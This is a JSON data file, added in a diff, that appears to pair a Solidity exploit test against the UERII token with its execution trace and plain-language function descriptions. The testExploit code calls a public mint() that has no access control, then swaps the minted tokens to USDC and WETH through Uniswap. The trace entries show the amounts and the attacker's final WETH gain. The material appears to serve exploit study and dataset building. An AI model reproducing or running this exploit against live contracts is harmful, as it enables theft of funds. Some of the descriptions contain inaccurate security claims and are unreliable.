@@ -1,0 +1,198 @@
+[
+    {
+        "id": "2614332",
+        "args": "",
+        "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\n            \"[Start] Attacker WETH balance before exploit\", WETH_TOKEN.balanceOf(address(this)), 18\n        );\n\n        // Actual payload exploiting the missing access control\n        UERII_TOKEN.mint();\n\n        // Exchanging the newly minted UERII for USDC\n        UERII_TOKEN.approve(address(UNI_ROUTER), type(uint256).max);\n        _UERIIToUSDC();\n\n        // Exchanging all USDC for WETH\n        USDC_TOKEN.approve(address(UNI_ROUTER), type(uint256).max);\n        _USDCToWETH();\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker WETH balance after exploit\", WETH_TOKEN.balanceOf(address(this)), 18\n        );\n    }\n\n    /**\n",
+        "description": "1. Core functions:  \nThe `testExploit` function is designed to simulate an attack scenario where an attacker exploits a vulnerability in a smart contract. The function performs three main actions:  \n- It mints new tokens (`UERII_TOKEN`) by exploiting a missing access control mechanism.  \n- It exchanges the newly minted tokens for USDC (a stablecoin) using a decentralized exchange router (`UNI_ROUTER`).  \n- It then exchanges all the USDC for WETH (Wrapped Ether) using the same router.  \nThe function also logs the attacker's WETH balance before and after the exploit to track the impact of the attack.  \n\n2. Security mechanism:  \nThe function does not include explicit security mechanisms to prevent unauthorized access or misuse. Instead, it highlights a vulnerability by exploiting a missing access control in the `UERII_TOKEN.mint()` function. The use of `type(uint256).max` in the `approve` function allows the attacker to grant unlimited spending permission to the router, which is a risky practice if not properly restricted.  \n\n3. Parameter Function:  \nThe function does not take any parameters. However, it interacts with several external contracts (`WETH_TOKEN`, `UERII_TOKEN`, `UNI_ROUTER`, and `USDC_TOKEN`) and uses their methods (`balanceOf`, `mint`, `approve`, and custom functions like `_UERIIToUSDC` and `_USDCToWETH`) to execute the exploit.  \n\n4. Return description:  \nThe function does not return any value. Instead, it emits two log events that display the attacker's WETH balance before and after the exploit. These balances are calculated using the `balanceOf` method of the `WETH_TOKEN` contract, which retrieves the WETH balance of the attacker's address (`address(this)`).  \n\nIn summary, the `testExploit` function demonstrates how an attacker can exploit a missing access control to mint tokens, exchange them for other assets, and ultimately increase their WETH balance. It serves as a warning about the importance of proper access control and security measures in smart contracts.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "2534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
+        "description": "1. **Core function:**  \n   The `balanceOf` function is designed to check and return the token balance of a specific account. It allows anyone to view how many tokens are held by a particular address in the smart contract.\n\n2. **Security mechanism:**  \n   - The function is marked as `public`, meaning it can be called by anyone.  \n   - It is also marked as `view`, which ensures that it does not modify the state of the contract, making it safe to call without incurring gas costs.  \n   - The `virtual override` keywords indicate that this function can be overridden by derived contracts, providing flexibility for customization.  \n\n3. **Parameter Function:**  \n   The function takes one parameter, `account`, which is an address. This address represents the account whose token balance you want to check.  \n\n4. **Return description:**  \n   The function returns a `uint256` value, which is the token balance of the specified account. It retrieves this balance directly from the `_balances` mapping, which stores the token balances of all accounts in the contract.  \n\n**In summary,**  \nThe `balanceOf` function is a simple and secure way to check the token balance of a specific account. It uses a mapping to retrieve the balance and ensures safety by being read-only and publicly accessible.",
+        "return_value": "0"
+    },
+    {
+        "id": "30122",
+        "args": "",
+        "original_code": "    function mint() public returns (bool) {\n        _mint( msg.sender, 100000000000000000 );\n        return true;\n    }\n    \n",
+        "description": "1. **Core functions:**  \n   The `mint` function is designed to create and distribute a fixed amount of tokens (specifically, 100000000000000000 units) to the address that calls this function. It acts as a way to generate new tokens and assign them to the sender.\n\n2. **Security mechanism:**  \n   This function does not include any explicit security measures such as access control or validation checks. It is publicly accessible, meaning anyone can call it and receive the tokens. This could pose a risk if not intended for unrestricted use.\n\n3. **Parameter Function:**  \n   The function does not take any parameters. It automatically uses the address of the caller (`msg.sender`) as the recipient of the minted tokens.\n\n4. **Return description:**  \n   The function always returns `true` after successfully executing the `_mint` operation. This indicates that the token minting process was completed without any issues.\n\n**In summary,**  \nThe `mint` function creates and assigns a fixed amount of tokens to the caller's address. It lacks security restrictions, making it accessible to anyone, and always returns `true` upon successful execution.",
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "25249",
+        "args": "UNI_ROUTER: [0xE592427A0AEce92De3Edee1F18E0157C05861564], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
+        "description": "1. Core functions:  \nThe `approve` function allows the caller (the owner of tokens) to grant permission to another address (the `spender`) to spend a specified amount of tokens on their behalf. This is a common function in token contracts to enable delegated spending.\n\n2. Security mechanism:  \nThe function uses the `public` and `virtual` modifiers, making it accessible to anyone and allowing it to be overridden in derived contracts. The `override` keyword ensures it correctly replaces any inherited function with the same name. Additionally, it calls `_msgSender()` to securely identify the caller, preventing potential impersonation attacks.\n\n3. Parameter Function:  \n- `spender`: The address of the account that is being granted permission to spend tokens.  \n- `amount`: The maximum number of tokens the `spender` is allowed to spend on behalf of the caller.  \n\n4. Return description:  \nThe function always returns `true` to indicate that the approval operation was successful. This is a standard practice in ERC-20 token contracts to confirm the action has been completed.  \n\nIn summary, the `approve` function enables token owners to delegate spending rights to another address, uses secure mechanisms to identify the caller, and confirms the operation by returning `true`.",
+        "return_value": "true"
+    },
+    {
+        "id": "863",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000 [1e17]"
+    },
+    {
+        "id": "2416072",
+        "args": "ExactInputSingleParams({ tokenIn: 0x418C24191aE947A78C99fDc0e45a1f96Afb254BE, tokenOut: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, fee: 500, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 1666009859 [1.666e9], amountIn: 100000000000000000 [1e17], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }",
+        "original_code": null,
+        "description": null,
+        "return_value": "2447241739 [2.447e9]"
+    },
+    {
+        "id": "2408640",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true, 100000000000000000 [1e17], 4295128740 [4.295e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b418c24191ae947a78c99fdc0e45a1f96afb254be0001f4a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "2425482740776 [2.425e12], -2447241739 [-2.447e9]"
+    },
+    {
+        "id": "44017",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2447241739 [2.447e9]",
+        "original_code": "    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n",
+        "description": "1. **Core functions:**  \n   The main purpose of this function is to transfer a specified amount of tokens from the sender's account to the recipient's account. It acts as a bridge to call an internal function (`_transfer`) that handles the actual transfer logic.\n\n2. **Security mechanism:**  \n   - The function uses `public` visibility, meaning it can be called by anyone.  \n   - It includes the `virtual` keyword, allowing it to be overridden by derived contracts.  \n   - The `override` keyword ensures it replaces any existing function with the same name in the parent contract.  \n   - The `_msgSender()` function is used to securely fetch the sender's address, which helps prevent certain types of attacks like phishing.  \n\n3. **Parameter Function:**  \n   - `recipient`: This is the address of the person or contract that will receive the tokens.  \n   - `amount`: This specifies the number of tokens to be transferred from the sender to the recipient.  \n\n4. **Return description:**  \n   The function always returns `true` after successfully calling the internal `_transfer` function. This indicates that the transfer operation was initiated and completed without errors.  \n\n**In summary,**  \nThis function facilitates the transfer of tokens between two addresses by calling an internal transfer function. It ensures security by using `_msgSender()` to fetch the sender's address and returns `true` to confirm the transfer was successful.",
+        "return_value": "true"
+    },
+    {
+        "id": "36728",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2447241739 [2.447e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2863",
+        "args": "UERII_USDC_PAIR: [0x5FFaf1B4Da96D6Cfd4045035A94A924fC39631dC]",
+        "original_code": null,
+        "description": null,
+        "return_value": "10797575730000571 [1.079e16]"
+    },
+    {
+        "id": "13845",
+        "args": "2425482740776 [2.425e12], -2447241739 [-2.447e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b418c24191ae947a78c99fdc0e45a1f96afb254be0001f4a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "9789",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], UERII_USDC_PAIR: [0x5FFaf1B4Da96D6Cfd4045035A94A924fC39631dC], 2425482740776 [2.425e12]",
+        "original_code": "    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n",
+        "description": "1. Core functions:  \nThe `transferFrom` function is designed to move a specific amount of tokens from one account (the sender) to another account (the recipient). It is commonly used in scenarios where a third party (like a smart contract or an approved user) is authorized to transfer tokens on behalf of the sender.\n\n2. Security mechanism:  \nThe function includes the `external` modifier, which ensures it can only be called from outside the contract, preventing internal misuse. Additionally, it typically relies on an approval mechanism, where the sender must first approve the caller to transfer tokens on their behalf. This ensures that only authorized parties can execute the transfer.\n\n3. Parameter Function:  \n- `sender`: The address of the account from which the tokens are being transferred.  \n- `recipient`: The address of the account that will receive the tokens.  \n- `amount`: The specific number of tokens to be transferred from the sender to the recipient.  \n\n4. Return description:  \nThe function returns a boolean value (`true` or `false`) to indicate whether the transfer was successful. If the transfer is completed without issues, it returns `true`; otherwise, it returns `false` to signal a failure.\n\nIn summary, the `transferFrom` function facilitates the transfer of tokens between accounts, ensures only authorized parties can execute it, and provides feedback on the success or failure of the operation.",
+        "return_value": "true"
+    },
+    {
+        "id": "863",
+        "args": "UERII_USDC_PAIR: [0x5FFaf1B4Da96D6Cfd4045035A94A924fC39631dC]",
+        "original_code": null,
+        "description": null,
+        "return_value": "10800001212741347 [1.08e16]"
+    },
+    {
+        "id": "27867",
+        "args": "UNI_ROUTER: [0xE592427A0AEce92De3Edee1F18E0157C05861564], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "27078",
+        "args": "UNI_ROUTER: [0xE592427A0AEce92De3Edee1F18E0157C05861564], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1315",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2447241739 [2.447e9]"
+    },
+    {
+        "id": "529",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2447241739 [2.447e9]"
+    },
+    {
+        "id": "87960",
+        "args": "ExactInputSingleParams({ tokenIn: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, tokenOut: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, fee: 500, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 1666009859 [1.666e9], amountIn: 2447241739 [2.447e9], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }",
+        "original_code": null,
+        "description": null,
+        "return_value": "1855150444286128408 [1.855e18]"
+    },
+    {
+        "id": "80528",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true, 2447241739 [2.447e9], 4295128740 [4.295e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002ba0b86991c6218b36c1d19d4a2e9eb0ce3606eb480001f4c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "2447241739 [2.447e9], -1855150444286128408 [-1.855e18]"
+    },
+    {
+        "id": "27962",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1855150444286128408 [1.855e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "USDC_WETH_PAIR: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640]",
+        "original_code": null,
+        "description": null,
+        "return_value": "53744284434404 [5.374e13]"
+    },
+    {
+        "id": "2529",
+        "args": "USDC_WETH_PAIR: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640]",
+        "original_code": null,
+        "description": null,
+        "return_value": "53744284434404 [5.374e13]"
+    },
+    {
+        "id": "14848",
+        "args": "2447241739 [2.447e9], -1855150444286128408 [-1.855e18], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002ba0b86991c6218b36c1d19d4a2e9eb0ce3606eb480001f4c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "10792",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], USDC_WETH_PAIR: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640], 2447241739 [2.447e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "9997",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], USDC_WETH_PAIR: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640], 2447241739 [2.447e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1315",
+        "args": "USDC_WETH_PAIR: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640]",
+        "original_code": null,
+        "description": null,
+        "return_value": "53746731676143 [5.374e13]"
+    },
+    {
+        "id": "529",
+        "args": "USDC_WETH_PAIR: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640]",
+        "original_code": null,
+        "description": null,
+        "return_value": "53746731676143 [5.374e13]"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1855150444286128408 [1.855e18]"
+    }
+]
